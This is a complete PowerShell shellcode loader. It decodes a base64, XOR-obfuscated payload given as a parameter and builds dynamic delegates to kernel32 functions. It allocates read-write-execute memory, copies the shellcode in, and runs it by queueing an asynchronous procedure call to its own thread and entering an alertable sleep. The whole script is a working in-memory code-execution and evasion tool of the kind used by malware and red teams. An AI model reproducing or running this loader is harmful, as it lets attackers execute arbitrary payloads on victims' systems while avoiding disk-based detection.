Param
        (
                [Parameter(Position = 0, Mandatory = $True)] [String] $b64EncSc,
                [Parameter(Position = 1, Mandatory = $True)] [Byte] $scXorKey
        )


function Get-DelegateType {
        Param
        (
                [Type[]] $Parameters = (New-Object Type[](0)),
                [Type] $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')

        Write-Output $TypeBuilder.CreateType()
}


function Get-ProcAddress {
        Param
        (
                [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
                [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
        )

        $NativeMethodsSig = @'
                [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
                public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

                [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                public static extern IntPtr GetModuleHandle(string lpModuleName);
'@

        $uniqueName = "Kernel32_" + (Get-Date -Format "HHmmssfff")

        $Kernel32 = Add-Type -MemberDefinition $NativeMethodsSig -Name $uniqueName -Namespace 'Win32' -PassThru

        $hModule = $Kernel32::GetModuleHandle($Module)
        if ($hModule -eq [IntPtr]::Zero) {
                throw "Couldn't find module $Module"
        }

        $procAddr = $Kernel32::GetProcAddress($hModule, $Procedure)
        if ($procAddr -eq [IntPtr]::Zero) {
                throw "Couldn't find procedure $Procedure in module $Module"
        }
        return $procAddr
}


$xoredSc = [System.Convert]::FromBase64String($b64EncSc)

$sc = for ($i = 0; $i -lt $xoredSc.Length; $i++) {
        [byte]($xoredSc[$i] -bxor $scXorKey)
}


Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 
{
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint SleepEx(uint dwMilliseconds, bool bAlertable);
}
"@


$NativeMethodsSig = @'
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint SleepEx(uint dwMilliseconds, bool bAlertable);
'@

$uniqueName = "Kernel32_" + (Get-Date -Format "HHmmssfff")

$Kernel32 = Add-Type -MemberDefinition $NativeMethodsSig -Name $uniqueName -Namespace 'Win32' -PassThru
if ($Kernel32) {
    Write-Host "Kernel32 type loaded: $($Kernel32.FullName)"
}

$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
if ($VirtualAllocAddr -ne 0) {
    Write-Host "VirtualAlloc address: 0x$($VirtualAllocAddr.ToString('X'))"
}

$QueueUserAPCAddr = Get-ProcAddress kernel32.dll QueueUserAPC
if ($QueueUserAPCAddr -ne 0) {
    Write-Host "QueueUserAPC address: 0x$($QueueUserAPCAddr.ToString('X'))"
}

$OpenThreadAddr = Get-ProcAddress kernel32.dll OpenThread
if ($OpenThreadAddr -ne 0) {
    Write-Host "OpenThread address: 0x$($OpenThreadAddr.ToString('X'))"
}

$GetThreadIdAddr = Get-ProcAddress kernel32.dll GetCurrentThreadId
if ($GetThreadIdAddr -ne 0) {
    Write-Host "GetCurrentThreadId address: 0x$($GetThreadIdAddr.ToString('X'))"
}

$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$QueueUserAPCDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr]) ([Int32])
$OpenThreadDelegate = Get-DelegateType @([UInt32], [Int32], [UInt32]) ([IntPtr])
$GetThreadIdDelegate = Get-DelegateType @() ([UInt32])

$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
if ($VirtualAlloc -ne $null) {
    Write-Host "VirtualAlloc delegate created successfully"
}

$QueueUserAPC = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($QueueUserAPCAddr, $QueueUserAPCDelegate)
if ($QueueUserAPC -ne $null) {
    Write-Host "QueueUserAPC delegate created successfully"
}

$OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)
if ($OpenThread -ne $null) {
    Write-Host "OpenThread delegate created successfully"
}

$GetCurrentThreadId = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetThreadIdAddr, $GetThreadIdDelegate)
if ($GetCurrentThreadId -ne $null) {
    Write-Host "GetCurrentThreadId delegate created successfully"
}

$mem = $VirtualAlloc.Invoke([IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
if ($mem -ne [IntPtr]::Zero) {
    Write-Host "Memory allocated at address: 0x$($mem.ToString('X'))"

    [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
    Write-Host "Shellcode copied to memory"
}

$currentThreadId = $GetCurrentThreadId.Invoke()
if ($currentThreadId -ne 0) {
    Write-Host "Current Thread ID: $currentThreadId"
}

$hThread = $OpenThread.Invoke(0x1F03FF, $false, $currentThreadId)
if ($hThread -ne [IntPtr]::Zero) {
        Write-Host "Thread handle obtained: 0x$($hThread.ToString('X'))"
        # Queue the APC
        $result = $QueueUserAPC.Invoke($mem, $hThread, [IntPtr]::Zero)

        if ($result -eq 0) {
                Write-Host "Failed to queue APC. Error code: " ([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
        } else {
                Write-Host "APC queued successfully. Shellcode will execute when thread enters an alertable state."

                $alertableSleepResult = $kernel32::SleepEx(1, $true)
                if ($alertableSleepResult -eq 0) {
                        Write-Host "SleepEx failed. Error code: " ([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
                }
        }

        $closeResult = [Kernel32]::CloseHandle($hThread)
        if (-not $closeResult) {
                Write-Host "Failed to close handle. Error code: " ([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
        }
} else {
        Write-Host "Failed to open thread. Error code: " ([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())
}
